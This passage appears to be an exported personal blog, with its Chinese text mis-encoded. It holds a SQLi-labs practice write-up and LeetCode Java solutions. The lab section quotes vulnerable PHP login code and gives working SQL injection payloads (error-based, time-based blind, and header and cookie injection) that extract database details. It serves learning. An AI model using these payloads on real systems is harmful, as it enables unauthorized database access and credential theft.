åŒå¼•å·è¿›è¡Œé—­åˆï¼Œä½†è¿˜æ˜¯ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œæºç å¦‚ä¸‹ 12345678&lt;? // connectivity $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;; $passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result);?&gt; 1uname=1&amp;passwd=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e))# Less-15/16Less-15ï¼špostæäº¤æ–¹å¼çš„sqlç›²æ³¨ï¼Œæ²¡æœ‰ä»»ä½•å›æ˜¾ï¼ŒæŠ¥é”™æ³¨å…¥ä¹Ÿä¸è¡Œï¼Œå¯ä»¥è¯•ä¸€è¯•å¸ƒå°”æ—¶é—´ç›²æ³¨ ä¸‹é¢ä¸¤ç§å†™æ³•éƒ½ä¸æ˜¯å¾ˆé€šç”¨ï¼Œä»–éœ€è¦å­˜åœ¨unameçš„å‰æä¸‹æ‰å¯ä»¥æ³¨å…¥ï¼Œæ‰€ä»¥å†™ä¸€ä¸ªé€šç”¨çš„ï¼ˆåœ¨æ²¡æœ‰wafçš„å‰æä¸‹ï¼‰ 12é”™è¯¯çš„payload: uname=admin&amp;passwd=1&#x27; and if(length(database())=8, sleep(5), 1) #é”™è¯¯çš„payload: uname=admin&#x27; and if(length(database())=8, sleep(5), 1) #&amp;passwd=1 12æ­£ç¡®çš„payload: uname=1&#x27; and 1=2 union select 1,sleep(5) #&amp;passwd=1 : uname=Dhakkan and if(length(database())=8, sleep(5), 1) #&amp;passwd=1 è¿™ç§å†™æ³•å°±è¦å¥½ä¸€ç‚¹ï¼Œåªéœ€è¦æŸ¥è¯¢è¿”å›çš„åˆ—ç›¸åŒå°±è¡Œ Less-16ï¼šå¥½åƒæ˜¯Hackbarå‡ºé—®é¢˜äº†ï¼ŒPOSTæäº¤æ–¹å¼æäº¤ä¸ä¸Šå»(ææ¸…æ¥šäº†ï¼Œä¸æ˜¯hackbarçš„é—®é¢˜ï¼Œå¦‚æœä½¿ç”¨hackbarçš„POSTæäº¤æ–¹å¼è¦å°†æ‰€æœ‰çš„å‚æ•°å†™å…¨) æºä»£ç å¦‚ä¸‹ï¼Œå› ä¸ºæ³¨é‡Šäº†ç™»å½•ä¿¡æ¯ï¼Œè¿˜ä½¿ç”¨@ç¬¦å·æŠ‘åˆ¶äº†sqlè¯­å¥æŠ¥é”™ï¼Œæ‰€ä»¥ä¸ä¼šæœ‰ä»»ä½•å›æ˜¾ï¼Œä½¿ç”¨ç›²æ³¨çˆ†ç ´ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123; $uname=$_POST[&#x27;uname&#x27;]; $passwd=$_POST[&#x27;passwd&#x27;]; //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;User Name:&#x27;.$uname.&quot;\\n&quot;); fwrite($fp,&#x27;Password:&#x27;.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;; $passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; //echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;; //echo &quot; You Have successfully logged in &quot; ; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; //echo &quot;Try again looser&quot;; //print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125;&#125;?&gt; 12payload: uname=1&quot;) and 1=2 union select 1,sleep(5) #&amp;passwd=1 : uname=Dhakkan&quot;) and if(length(database())=8, sleep(5), 1) #&amp;passwd=1 æŠŠä¸Šé¢çš„sleepå‡½æ•°æ¢æˆifåˆ¤æ–­è¯­å¥å°±å¯ä»¥è¿›è¡Œçˆ†ç ´äº†ï¼Œä½†æ˜¯ç›²æ³¨è„šæœ¬è¿˜æ˜¯æ²¡æœ‰å†™ï¼Œæ‡’ç‹—ä¸€æ¡ï¼Œå…ˆå­¦å­¦sqlmapçš„ä½¿ç”¨æ–¹å¼ï¼ˆå­¦ç©å°±å†™ï¼‰ Less-17/18Less-17ï¼šåŸºäºæ›´æ–°è¯­å¥çš„æŠ¥é”™æ³¨å…¥ï¼Œå®¡æºç é€»è¾‘ã€‚æœ‰ä¸€ä¸ªcheck_inputå‡½æ•°ï¼Œä½œç”¨æ˜¯å»æ‰è½¬æ„çš„åæ–œæ ï¼Œç¡®ä¿unameæ²¡æœ‰sqlæ³¨å…¥ï¼Œä½†æ˜¯è¿˜è¦ç ”ç©¶ç ”ç©¶è¿™ä¸ªå‡½æ•°ï¼Œæ„Ÿè§‰è¿™å…³ä¸»è¦å°±æ˜¯å­¦ä¹ è¿™ä¸ªcheck_inputå‡½æ•°ã€‚åœ¨æ£€æŸ¥unameä¹‹åï¼Œè¿›è¡ŒæŸ¥è¯¢ å…³äºMysqlä¸­çš„updateè¯­å¥ï¼Œå¦‚æœåé¢ä¸åŠ é™åˆ¶æ¡ä»¶ï¼Œé‚£ä¹ˆæ”¹å˜çš„æ˜¯æ•´ä¸ªè¡¨çš„å€¼ï¼Œåé¢å¯ä»¥æ¥andè·Ÿæˆ‘ä»¬éœ€è¦çš„æŠ¥é”™è¯­å¥ï¼Œå¦‚æœæºä»£ç ä¸­æ²¡æœ‰æ²¡æ”¶æŠ¥é”™å›æ˜¾ï¼Œé‚£ä¹ˆå°±å¯ä»¥æˆåŠŸä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚ä½†æ˜¯è¿™é“é¢˜æœ‰ä¸ªæ¡ä»¶ï¼Œé‚£å°±æ˜¯ç”¨æˆ·åå¿…é¡»å­˜åœ¨ã€‚ 1payload: uname=Dhakkan&amp;passwd=1&#x27; and updatexml(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)), 1) # Less-18ï¼šå¤´éƒ¨æŠ¥é”™æ³¨å…¥ï¼Œä½¿ç”¨ä»£ç†æäº¤ï¼Œä¼°è®¡æ˜¯æƒ³è®©æˆ‘ä»¬ä½¿ç”¨burpsuiteæŠ“åŒ…ä¿®æ”¹å¤´éƒ¨ä»£ç† éœ€è¦äº†è§£çš„çŸ¥è¯†ï¼šUser Agent è¿™å…³å¼€å§‹çš„æºä»£ç å†™å¾—æœ‰ç‚¹æ„æ€ï¼Œcheck_inputå‡½æ•°æ²¡æœ‰å•¥å˜åŒ–ï¼Œå¯¹unameå’Œpasswdåšäº†å¤„ç†ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªå‚æ•°æ²¡æœ‰äº†sqlæ³¨å…¥çš„å¯èƒ½æ€§ã€‚ è¿™ä¸€å…³çš„å‰ææ˜¯éœ€è¦çŸ¥é“ç”¨æˆ·çš„è´¦å·å’Œå¯†ç ï¼Œå¯ä»¥é€šè¿‡å‰é¢çš„å…³å¡æ³¨å…¥å‡ºæ¥ï¼Œå°±ä¸è¿‡å¤šèµ˜è¿°ã€‚ç»§ç»­å®¡ä»£ç ï¼Œå‘ç°ä»£ç çš„é€»è¾‘æ˜¯è·å–ç”¨æˆ·çš„IPå’ŒUagentæ’å…¥åˆ°è¡¨uagentsä¸­ï¼Œä¸”å‚æ•°Uagentæ²¡æœ‰åšä»»ä½•å¤„ç†ï¼Œæ‰€ä»¥å­˜åœ¨sqlæ³¨å…¥ã€‚ é¦–å…ˆå¯ä»¥è‡ªå®šä¹‰æ’å…¥æ•°æ®: 1payload: 111&#x27;, &#x27;127.0.0.1&#x27;, &#x27;hack&#x27;) # è‡ªå®šä¹‰æ’å…¥æ•°æ®é‚£å°±æ˜¯æœ‰æœºä¼šè¿›è¡ŒäºŒæ¬¡æ³¨å…¥ï¼Œä½†æ˜¯è¿™ä¸€å…³æ˜¯è®©æˆ‘ä»¬ç›´æ¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥æ¥è·å–æ•°æ®åº“çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ‰€ä»¥éœ€è¦å¦å¤–æƒ³åŠæ³•ã€‚ è¿™é‡Œç›´æ¥åœ¨uagentå˜é‡åé¢æ¯”å’Œå•å¼•å·ï¼Œç„¶åæ‹¼æ¥æŠ¥é”™è¯­å¥ã€‚ 1payload: 1&#x27; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) , 1, 1) # è¿™ä¸€å…³æ„Ÿè§‰å°±æ˜¯æ•™ä½ å¦‚ä½•åœ¨insertè¯­å¥ä¸‹ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œä¿®æ”¹uagentä¹‹ç±»çš„æŠ“åŒ…ä¿®æ”¹éƒ½è¿˜æ¯”è¾ƒç®€å•ã€‚ Less-19/20Less-19ï¼šéœ€è¦é¦–å…ˆäº†è§£çš„çŸ¥è¯†Referer ï¼ˆä¸­æ–‡ç¿»è¯‘å«å¼•èäººï¼‰-&gt; HTTP è¯·æ±‚çš„å¤´ä¿¡æ¯é‡Œé¢ï¼ŒReferer æ˜¯ä¸€ä¸ªå¸¸è§å­—æ®µï¼Œæä¾›è®¿é—®æ¥æºçš„ä¿¡æ¯ã€‚ å…¶ä»–æ„Ÿè§‰å’Œ18å…³å·®ä¸å¤šï¼Œéƒ½æ˜¯insertè¯­å¥æŠ¥é”™æ³¨å…¥ï¼Œå”¯ä¸€çš„ä¸åŒç‚¹å°±æ˜¯ä¿®æ”¹çš„æ•°æ®æ®µä¸ºrefereræ®µï¼Œ18å…³ä¿®æ”¹çš„æ˜¯User-Agentæ®µ 1payload: 1&#x27; and updatexml(1, concat(0x7e, (select version()), 0x7e), 1) ,1 ,1) # Less-20ï¼šCookieæ³¨å…¥ ç™»å½•è¿›å»åä¼šæ˜¾ç¤ºCookieä¿¡æ¯ â€‹ æ²¡å•¥æ€è·¯ï¼Œçœ‹æºç å­¦ä¹  é¦–å…ˆè¿˜æ˜¯å¯¹unameå’Œpasswdåšäº†è¿‡æ»¤ï¼Œæ‰€æœ‰è¿™ä¸¤ä¸ªå‚æ•°ä¸å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œéœ€è¦æŸ¥æ‰¾å¦å¤–çš„æ³¨å…¥ç‚¹ï¼Œé€šè¿‡ä¸€ç•ªæŠ“åŒ…è°ƒè¯•å‘ç°äº†æ³¨å…¥ç‚¹ 1234567891011121314151617181920&lt;? $sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;; $result=mysql_query($sql); if (!$result) &#123; die(&#x27;Issue with your mysql: &#x27; . mysql_error()); &#125; $row = mysql_fetch_array($result); if($row) &#123; echo &#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your ID:&#x27; .$row[&#x27;id&#x27;]; &#125;?&gt; 1æµ‹è¯•payload: admin&#x27; and 1=2 union select 1,2,3 # å¯ä»¥çœ‹åˆ°å·²ç»èƒ½å¤Ÿæ§åˆ¶å›æ˜¾äº†ï¼Œä½†æ˜¯è¿™å…³æ˜¯è¦æˆ‘ä»¬ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œæ‰€ä»¥æ–¹æ³•æ²¡æœ‰å¯¹ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥æ¥è¿‡å…³ã€‚ è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç–‘é—®ï¼Œé‚£å°±æ˜¯æœ‰ä¸€ä¸ªI LOVE COOKIEé‚£ä¸ªé¡µé¢æ˜¯æ€ä¹ˆå‡ºæ¥çš„ä¹Ÿéœ€è¦æ€è€ƒä¸‹ã€‚ 1æŠ¥é”™æ³¨å…¥payload: admin&#x27; and updatexml(1, concat(0x7e,(select version()), 0x7e), 1) # å¾—åˆ°å›æ˜¾é¡µé¢ï¼Œå…¶ä»–çš„æ•°æ®é€šè¿‡æ›¿æ¢select version()è¯­å¥å¾—åˆ°å…¶ä»–ä¿¡æ¯ã€‚ EndingSQLi-labsçš„åŸºç¡€å…³ç®—æ˜¯å¼„å®Œäº†ï¼Œä½†æ˜¯æœ‰å¾ˆå¤šç»†èŠ‚è¿˜æ²¡æœ‰æ·±ç©¶ï¼Œæ¯”å¦‚æœ‰å¾ˆå¤šå…³å¡ä¸æ­¢ä¸€ç§æ–¹å¼æ³¨å…¥ï¼Œè¿˜æœ‰å¾ˆå¤šçš„æ³¨å…¥å§¿åŠ¿æ²¡æœ‰å­¦åˆ°ï¼Œè¿˜è¦èŠ±æ—¶é—´ç ”ç©¶ç ”ç©¶ã€‚","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"leetcodeåˆ·é¢˜è®°å½•-1","slug":"leetcode/leetcode1","date":"2021-07-14T04:44:17.510Z","updated":"2022-01-01T09:53:03.640Z","comments":true,"path":"41353/","link":"","permalink":"http://example.com/41353/","excerpt":"","text":"towsum 123456789101112public int[] twoSum(int[] nums, int target) &#123; int[] index = new int[2]; for (int i = 0; i &lt; nums.length; i++) &#123; for (int j = 0; j &lt; nums.length; j++) &#123; if (nums[i] + nums[j] == target &amp;&amp; i != j) &#123; index[0] = i; index[1] = j; &#125; &#125; &#125; return index; &#125; hashMap ä¸Šé¢çš„æ–¹æ³•åœ¨æ—¶é—´å¤æ‚å µä¸Šä¸ºO(n*n)ï¼Œåœ¨æ•°æ®è¿‡å¤§æ—¶ååˆ†æš´åŠ›ï¼Œå¯ä»¥é‡‡ç”¨å“ˆå¸Œè¡¨æ¥æ£€ç´¢ reverse çœ‹åˆ°åˆ«äººçš„åšæ³•æ‰æ„Ÿè§‰å¥½å‰å®³ï¼Œæ€è·¯éå¸¸çµæ´»ã€‚ è¿™ç§æ ¹æ®åŸç†åˆ¤æ–­æ•´æ•°æ˜¯å¦æº¢å‡ºè™½ç„¶æ¯”è¾ƒç§‘å­¦ï¼Œä½†æ„Ÿè§‰æ²¡æœ‰æ¦œä¸€å¤§å“¥é‚£ä¹ˆæœ‰çµæ€§ 12345678910111213141516public int reverse(int x) &#123; int ret = 0; while(x != 0)&#123; // å…ˆåˆ¤æ–­å€’åºæ•°å­—æ˜¯å¦æ»¡è¶³æ¡ä»¶ if(ret&gt;Integer.MAX_VALUE/10 || (ret==Integer.MAX_VALUE/10 &amp;&amp; x&gt;7))&#123; return 0; &#125; if(ret&lt;Integer.MIN_VALUE/10 || (ret==Integer.MIN_VALUE/10 &amp;&amp; x&lt;-8))&#123; return 0; &#125; ret = ret*10+x%10; x /= 10; &#125; return ret; &#125; isPalindrome è¿™é“é¢˜å’Œä¸Šé¢å°†æ•°å­—å€’åºçš„æ€æƒ³æ˜¯ä¸€æ ·çš„ 12345678910111213141516public boolean isPalindrome(int x)&#123; // åˆ¤æ–­è´Ÿæ•° if(x&lt;0)&#123; return false; &#125;else &#123; int temp = x, cmpNum=0; while (temp != 0)&#123; cmpNum = cmpNum*10 + temp%10; temp /= 10; &#125; if(cmpNum==x)&#123; return true; &#125; return false; &#125; &#125; romanToInt è¿™é“é¢˜ä¹Ÿå¯ä»¥ç”¨æ‰“è¡¨çš„æ€è·¯ï¼Œå°†ä¸èƒ½å•ä¸ªå­—ç¬¦è¡¨ç¤ºçš„ç½—é©¬æ•°å­—å…¨éƒ¨ç©·ä¸¾å‡ºæ¥ï¼Œè¿™é‡Œåªæœ‰6ç»„ï¼Œç„¶åä¸Šå“ˆå¸Œè¡¨ 124, 9, 40, 90, 400, 900IV IX XL XC CD CM ä»å³åˆ°å·¦æ¥åˆ‡å‰²åˆ¤æ–­ 123456789101112131415161718192021public int romanToInt(String s) &#123; int ret = 0; String[] strArr = &#123;&quot;I&quot;,&quot;IV&quot;,&quot;V&quot;,&quot;IX&quot;,&quot;X&quot;,&quot;XL&quot;,&quot;L&quot;,&quot;XC&quot;,&quot;C&quot;,&quot;CD&quot;,&quot;D&quot;,&quot;CM&quot;,&quot;M&quot;&#125;; int[] num = &#123;1,4,5,9,10,40,50,90,100,400,500,900,1000&#125;; HashMap&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0; i &lt; strArr.length; i++) &#123; map.put(strArr[i],num[i]); &#125; for (int i = 0; i &lt; s.length();) &#123; if (i+2&lt;=s.length() &amp;&amp; (map.containsKey(s.substring(i,i+2))))&#123; ret += map.get(s.substring(i,i+2)); i += 2; continue; &#125; ret += map.get(s.substring(i,i+1)); i += 1; &#125; return ret; &#125; largestNumber è¿™é“é¢˜æŠ˜ç£¨äº†ä¸€å¤©ï¼Œéœ€è¦ç”¨åˆ°åˆ«äººæ„Ÿè§‰å¹¶ä¸å¤æ‚ä½†æ˜¯æˆ‘çœ‹ä¸æ‡‚çš„æ•°å­¦è¯æ˜ï¼Œæ‰€ä»¥æ•°å­¦è¯æ˜æ˜¯ä¸å¯èƒ½è¯æ˜çš„ï¼Œç”¨å­—ç¬¦ä¸²è§£å†³ 1234567891011121314151617181920212223242526public String largestNumber(int[] nums)&#123; /// ä¸èƒ½ç”¨é¡ºåºæ’åˆ— /// æ•°å­—æ’åºå’Œå­—ç¬¦ä¸²æ’åºæ€è·¯éƒ½ä¸åŒ int n = nums.length; String[] numStr = new String[n]; for (int i = 0; i &lt; n; i++) &#123; numStr[i] = String.valueOf(nums[i]); &#125; /// compareToè¿”å›å‰å­—ç¬¦ä¸²æ¯”è¾ƒå­—ç¬¦ASCIIä¸åå­—ç¬¦ä¸²æ¯”è¾ƒå­—æ¯ASCIIçš„å·®å€¼ Arrays.sort(numStr,(a, b)-&gt;&#123; // ä½¿ç”¨lambdaé‡å†™sortå‡½æ•°ï¼Œä½¿å…¶å­—ç¬¦ä¸²é€†åºæ’åº return (b+a).compareTo(a+b); // å¦‚æœåé¢åŠ èµ·æ¥æ¯”å‰é¢å¤§çš„è¯ï¼Œè¿”å›1 // å¦åˆ™è¿”å›0 &#125;); System.out.println(Arrays.toString(numStr)); if(numStr[0].equals(&quot;0&quot;))&#123; return &quot;0&quot;; &#125; StringBuilder ret = new StringBuilder(); for (int i = 0; i &lt; numStr.length; i++) &#123; ret.append(numStr[i]); &#125; return ret.toString(); &#125; é»‘ç™½æ–¹æ ¼ç”» ä¸€é“çº¯è€ƒæ’åˆ—ç»„åˆçš„æ•°å­¦é¢˜ï¼Œä¸¤å¹´æ²¡æœ‰ç¢°è¿‡è¿™äº›è€ƒæ™ºå•†çš„ä¸œè¥¿ï¼Œè„‘è¢‹æ²¡è½¬è¿‡å¼¯æ¥ï¼Œè™½ç„¶é‡Œé¢åŒ…å«çš„æ•°å­¦çŸ¥è¯†ä¹Ÿä¸æ˜¯å¾ˆå¤æ‚ï¼Œ 12345678910111213141516171819202122232425public int factorial(int a)&#123; if(a == 1 || a == 0) return 1; return factorial(a-1)*a; &#125; public int combine(int n, int a)&#123; return factorial(n)/(factorial(a)*factorial(n-a)); &#125; public int paintingPlan(int n, int k) &#123; if (n*n == k)&#123; return 1; &#125;else if(n &gt; k)&#123; return 0; &#125; int ret = 0; for(int a=0; a&lt;=n; a++)&#123; for(int b=0; b&lt;=n; b++)&#123; if(k == n*(a+b)-a*b)&#123; ret += combine(n, a)*combine(n, b); &#125; &#125; &#125; return ret; &#125; è·³æ°´æ¿ &amp;&amp; é’è›™è·³å°é˜¶ è¿™é“é¢˜å¦‚æœç”¨çº¯é€’å½’çš„æ–¹æ³•å»åšå±å®ä¸è¡Œï¼Œæ—¶é—´å¤æ‚åº¦å¤ªé«˜äº†&lt;O(2^n)&gt;ï¼Œæ–æ³¢é‚£å¥‘æ•°åˆ—çš„æ€§è´¨æ˜¯ä¸€æ ·çš„ï¼Œå‰é¢ä¸¤ä¸ªæ•°å†³å®šåä¸€ä¸ªæ•°ï¼ŒåŠ¨æ€è§„åˆ’ é€’å½’æ–¹æ³• 12345public int divingBoard(int shorter, int longer, int k)&#123; if (k &lt; 0)return 0; if (k == 0)return 1; return climb(shorter, longer, k - 1) + climb(shorter, longer, k - 2); &#125; éé€’å½’æ–¹æ³• 1234567891011121314public int[] divingBoard(int shorter, int longer, int k) &#123; if(k == 0)&#123; return new int[0]; &#125; else if (shorter == longer)&#123; int[] ret = &#123;shorter * k&#125;; return ret; &#125; int[] board = new int[k + 1]; int shortest = k * shorter; for (int i = 0; i &lt; k + 1; i++) &#123; board[i] = shortest + i * (longer - shorter); &#125; return board; &#125; é‡è¦çš„å‘˜å·¥ 123456789101112131415161718192021222324252627282930313233public int retSubImp(Employee pre, List&lt;Employee&gt; employees)&#123; if (pre.subordinates.isEmpty())&#123; return 0; &#125; int imp = 0; for (Integer sub : pre.subordinates) &#123; for (Employee employee : employees ) &#123; if (sub == employee.id)&#123; imp += employee.importance; imp += retSubImp(employee, employees); &#125; &#125; &#125; return imp; &#125; public int getImportance(List&lt;Employee&gt; employees, int id) &#123; int imp = 0; for (Employee staff : employees) &#123; if (staff.id == id)&#123; imp += staff.importance; for (Integer subid : staff.subordinates) &#123; imp += retSubImp(staff, employees); break; &#125; &#125; &#125; return imp; &#125; æ‰«é›· è¿™é“é¢˜æœ‰ç‚¹å¥½ç©ğŸ˜›ï¼Œdfsæœç´¢ä¸€å…±ä¸‰ä¸ªæ­¥éª¤ åˆ¤æ–­è¯¥åæ ‡æ˜¯å¦ä¸ºé›·ï¼Œå¦‚æœæ˜¯é›·å°±ç›´æ¥ç»“æŸæ¸¸æˆ å¦‚æœä¸æ˜¯é›·ï¼Œåˆ¤æ–­åæ ‡å‘¨å›´é›·çš„ä¸ªæ•°ï¼Œå¦‚æœä¸ªæ•°ä¸ä¸º0ï¼Œåˆ™æ ‡è®°é›·çš„ä¸ªæ•°ï¼Œç»“æŸæ¸¸æˆ å¦‚æœå‘¨å›´æ²¡æœ‰é›·ï¼Œåˆ™é€’å½’æ£€ç´¢å‘¨å›´æ²¡æœ‰è¶Šç•Œçš„åæ ‡ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556int width;int height;int countBomb = 0;int[][] step = &#123;&#123;1, 0&#125;, &#123;-1, 0&#125;, &#123;0, 1&#125;, &#123;0, -1&#125;, &#123;-1, -1&#125;, &#123;-1, 1&#125;, &#123;1, -1&#125;, &#123;1, 1&#125;&#125;;char[] dic = &#123;&#x27;0&#x27;, &#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;&#125;;public void updateBoardDfs(char[][] board, int x, int y, int[][] sign)&#123; if (x &gt;= height || x &lt; 0 || y &gt;= width || y &lt; 0 || sign[x][y] == 1)&#123; return; &#125; // é¦–å…ˆåˆ¤æ–­å‘¨å›´8ä¸ªæ–¹å‘æ˜¯å¦æœ‰é›· getCountBomb(board, x, y); if (countBomb != 0)&#123; board[x][y] = dic[countBomb]; countBomb = 0; return; &#125; // å…«ä¸ªæ–¹å‘ for (int i = 0; i &lt; 8; i++) &#123; int post_x = x + step[i][0]; int post_y = y + step[i][1]; board[x][y] = &#x27;B&#x27;; sign[x][y] = 1; updateBoardDfs(board, post_x, post_y, sign); &#125;&#125;public void getCountBomb(char[][] board, int x, int y)&#123; for (int i = 0; i &lt; 8; i++) &#123; int post_x = x + step[i][0]; int post_y = y + step[i][1]; if (post_x &gt;= height || post_x &lt; 0 || post_y &gt;= width || post_y &lt; 0) continue; if (board[post_x][post_y] == &#x27;M&#x27;) countBomb++; &#125;&#125;/* * åˆ¤æ–­ç‚¹å‡»æ˜¯å¦ä¸ºé›· * æ£€ç´¢å‘¨å›´8ä¸ªæ–¹å‘æ˜¯å¦æœ‰é›·ï¼Œæ— é›·æ ‡è®°ä¸ºB * æœ‰é›·æ ‡æ£€ç´¢æœ‰é›·ä¸ªæ•°ï¼Œç„¶åæ ‡è®°æ•°å­— * */public char[][] updateBoard(char[][] board, int[] click)&#123; width = board[0].length; height = board.length; int[][] sign = new int[height][width]; // ç©å®¶ç‚¹å‡»çŸ©é˜µåæ ‡ char playerClickPot = board[click[0]][click[1]]; if (playerClickPot == &#x27;M&#x27;)&#123; board[click[0]][click[1]] = &#x27;X&#x27;; &#125;else &#123; updateBoardDfs(board, click[0], click[1], sign); &#125; return board;&#125; åœ¨Då¤©å†…é€è¾¾åŒ…è£¹çš„èƒ½åŠ› çœ‹é¢˜è§£æ‰“å¡ä¸‹ç­ 12345678910111213141516171819202122232425class Solution &#123; public int shipWithinDays(int[] weights, int D) &#123; int left = Arrays.stream(weights).max().getAsInt(); int right = Arrays.stream(weights).sum(); while (left &lt; right)&#123; int middle = (left+right) &gt;&gt; 1; int needDay = 1; int sum = 0; for (int goodWeight : weights)&#123; if (sum + goodWeight &gt; middle)&#123; needDay++; sum = 0; &#125; sum += goodWeight; &#125; if (needDay &lt;= D)&#123; right = middle; &#125; else &#123; left = middle + 1; &#125; &#125; return right; &#125;&#125;","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://example.com/tags/leetcode/"}]},{"title":"leetcodeåˆ·é¢˜è®°å½•-2","slug":"leetcode/leetcode2","date":"2021-07-14T04:44:17.510Z","updated":"2022-01-01T09:53:14.858Z","comments":true,"path":"37154/","link":"","permalink":"http://example.com/37154/","excerpt":"","text":"Hanota ç»å…¸é€’å½’é—®é¢˜ï¼Œä»è¿™é“é¢˜å­¦åˆ°çš„å…³äºé€’å½’çš„æ€æƒ³æŒºå¤šçš„ 123456789101112131415class Solution &#123; public void move(int size, List&lt;Integer&gt; A, List&lt;Integer&gt; B, List&lt;Integer&gt; C)&#123; if (size == 1)&#123; C.add(A.remove(A.size() - 1)); return; &#125; move(size - 1, A, C, B); C.add(A.remove(A.size() - 1)); move(size - 1, B, A, C); &#125; public void hanota(List&lt;Integer&gt; A, List&lt;Integer&gt; B, List&lt;Integer&gt; C) &#123; move(A.size(), A, B, C); &#125;&#125; Plaint ç»å…¸çš„dfsé—®é¢˜ï¼Œå¥½åƒæœ‰ä¸€ä¸ªæ¯”è¾ƒé«˜å¤§ä¸Šçš„åå­—å«åšæ¼«æ°´ç®—æ³•ï¼Ÿ 12345678910111213141516171819202122232425262728class Solution &#123; public void dfs(int[][] image, int[][] sign, int sr, int sc, int newColor)&#123; if (sign[sr][sc] == 1)&#123; return; &#125; int[][] step = &#123;&#123;1, 0&#125;, &#123;-1, 0&#125;, &#123;0, 1&#125;, &#123;0, -1&#125;&#125;; int width = image.length; int length = image[0].length; sign[sr][sc] = 1; int temp = image[sr][sc]; image[sr][sc] = newColor; for (int i = 0; i &lt; 4; i++) &#123; int row = sr + step[i][0]; int col = sc + step[i][1]; if (row &gt;= width || row &lt; 0 || col &gt;= length || col &lt; 0 || sign[row][col] == 1 || temp != image[row][col])&#123; continue; &#125; dfs(image, sign, row, col, newColor); &#125; &#125; public int[][] floodFill(int[][] image, int sr, int sc, int newColor) &#123; int[][] sign = new int[image.length][image[0].length]; dfs(image, sign ,sr, sc, newColor); return image; &#125;&#125; å²›å±¿æ•°é‡ åˆ·LeetCodeç¬¬ä¸€æ¬¡ä¸€éè¿‡ğŸ˜ åˆ¤æ–­æ˜¯å¦ä¸ºæ°´ï¼Œæˆ–åˆ¤æ–­æ ‡è®°æ˜¯å¦èµ°è¿‡ dfsç¡®å®šè¿åœ¨ä¸€èµ·çš„å²›çš„èŒƒå›´ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Solution &#123; int height = 0; int width = 0; // ä¸Šä¸‹å·¦å³æ”¹å˜ int[][] step = &#123;&#123;1,0&#125;,&#123;-1,0&#125;,&#123;0,1&#125;,&#123;0,-1&#125;&#125;; public void numIslandsDfs(char[][] grid, int row, int col, int[][] book)&#123; //å¦‚æœè¶Šç•Œå°±è¿”å› if (row &lt; 0 || row &gt;= height || col &lt; 0 || col &gt;= width)return; // å¦‚æœæ˜¯æ°´åŸŸæˆ–è€…è¯¥ç‚¹å·²ç»èµ°è¿‡ä¹Ÿè¿”å› 